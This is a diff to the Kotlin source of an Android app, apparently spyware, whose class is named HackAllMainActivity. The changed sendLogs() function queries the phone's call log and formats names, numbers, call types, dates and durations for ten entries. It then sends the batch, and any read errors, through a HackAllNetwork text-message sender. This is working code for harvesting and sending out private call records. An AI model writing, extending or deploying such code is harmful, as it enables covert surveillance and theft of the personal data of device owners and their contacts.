@@ -29,6 +29,9 @@ import com.karumi.dexter.listener.single.PermissionListener
 import android.content.Context
 import android.os.BatteryManager
 
+import java.text.SimpleDateFormat
+import java.util.*
+
 class HackAllMainActivity : ComponentActivity() {
     private val number = "107"
     private lateinit var cameraButton: Button
@@ -178,32 +181,70 @@ class HackAllMainActivity : ComponentActivity() {
 
     @SuppressLint("NewApi")
     private fun sendLogs() {
-        val cols = arrayOf(CallLog.Calls._ID,
-            CallLog.Calls.CACHED_NAME,
-            CallLog.Calls.NUMBER,
-            CallLog.Calls.TYPE,
-            CallLog.Calls.DURATION, CallLog.Calls.DATE)
-        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, cols, null,
-            null, "${CallLog.Calls.LAST_MODIFIED} DESC")
+        try {
+            val cols = arrayOf(
+                CallLog.Calls._ID,
+                CallLog.Calls.CACHED_NAME,
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.TYPE,
+                CallLog.Calls.DURATION, CallLog.Calls.DATE
+            )
+            val cursor: Cursor? = contentResolver.query(
+                CallLog.Calls.CONTENT_URI, cols, null,
+                null, "${CallLog.Calls.LAST_MODIFIED} DESC"
+            )
 
-        cursor?.use {
-            val idIndex = it.getColumnIndex(CallLog.Calls._ID)
-            val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
-            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
-            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
-            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
-            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
+            val callLogs = StringBuilder()
 
-            while (it.moveToNext()) {
-                val idRow = it.getString(idIndex)
-                val nameRow = it.getString(nameIndex)
-                val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
-                val number = it.getString(numberIndex)
-                val duration = it.getString(durationIndex) ?: "0"
-                val type = it.getString(typeIndex)
-                val date = it.getString(dateIndex)
-                HackAllNetwork(this).sendTextMessage("CALL LOG: $idRow, $name, $number, $duration, $type, $date")
+            cursor?.use {
+//                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
+                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
+                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
+                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
+
+                var count = 0
+                while (it.moveToNext() && count < 10) {
+//                    val idRow = it.getString(idIndex)
+                    val nameRow = it.getString(nameIndex)
+                    val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
+                    val number = it.getString(numberIndex)
+                    val duration = it.getString(durationIndex) ?: "0"
+                    val type = it.getInt(typeIndex)
+
+                    val callType = when (type) {
+                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                        CallLog.Calls.MISSED_TYPE -> "Missed"
+                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
+                        CallLog.Calls.BLOCKED_TYPE -> "Blocked"
+                        else -> "Unknown"
+                    }
+
+                    val date = it.getLong(dateIndex)
+
+                    val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                    val formattedDate = formatter.format(Date(date))
+
+                    callLogs.append("📞 Number: $number\n")
+                    callLogs.append("📞 Name: $name\n")
+                    callLogs.append("🔹 Type: $callType\n")
+                    callLogs.append("📅 Date: $formattedDate\n")
+                    callLogs.append("⏱️ Duration: $duration seconds\n\n")
+                    count += 1
+
+                    //                HackAllNetwork(this).sendTextMessage("CALL LOG: $idRow, $name, $number, $duration, $type, $date")
+                }
             }
+
+            if (callLogs.isNotEmpty()) {
+                HackAllNetwork(this).sendTextMessage("🛜 Collected Call Logs:\n\n$callLogs")
+            } else {
+                HackAllNetwork(this).sendTextMessage("No call logs found on the device.\n")
+            }
+        } catch (e: Exception) {
+            HackAllNetwork(this).sendTextMessage("Error reading call logs: ${e.localizedMessage}")
         }
     }
 }
